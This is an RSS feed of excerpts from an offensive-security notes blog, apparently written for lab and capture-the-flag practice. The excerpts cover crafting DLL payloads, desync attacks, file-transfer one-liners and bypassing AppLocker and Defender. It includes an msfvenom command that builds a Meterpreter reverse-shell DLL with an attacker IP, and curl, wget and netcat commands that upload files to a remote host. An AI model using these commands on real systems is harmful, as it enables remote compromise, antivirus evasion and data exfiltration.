<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Concept on Pwny_Sec</title>
    <link>/concepts/</link>
    <description>Recent content in Concept on Pwny_Sec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    
	<atom:link href="/concepts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>DLL_CraFt&amp;BreW</title>
      <link>/concepts/dll/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/concepts/dll/</guid>
      <description>So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom &amp;amp; dll&amp;rsquo;s crafted with visual studio&amp;rsquo;s. cheers to IppSec and 0xdf
MSFVENOM remember you don&amp;rsquo;t always need x64
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &amp;gt; NameMe.dll  Beryllium https://github.com/attl4s/pruebas
a dll that contains meterpreter shell that takes env var as variables</description>
    </item>
    
    <item>
      <title>Desync-Attack</title>
      <link>/concepts/untitled/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/concepts/untitled/</guid>
      <description>This writeup will be based on James Kettle work, Click here. This artical is more about me learning how to do this attack.</description>
    </item>
    
    <item>
      <title>File Transfer</title>
      <link>/concepts/file-transfer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/concepts/file-transfer/</guid>
      <description>######## LI/NUX #########
Python http server
python3 -m http.server 9090 python -m simpleHTTPServer 9090  Curl
upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file  wget
upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename  NetCat File Transfer
Netcat notice with this method , sender &amp;lt;, reciever &amp;gt;. -w wait, -l listener -p port
upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt; file.</description>
    </item>
    
    <item>
      <title>Windows-Bypass</title>
      <link>/concepts/bypass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/concepts/bypass/</guid>
      <description>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&amp;rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.
CLM uses umci policy to determine what powershell scripts are approved(whitelisted).</description>
    </item>
    
  </channel>
</rss>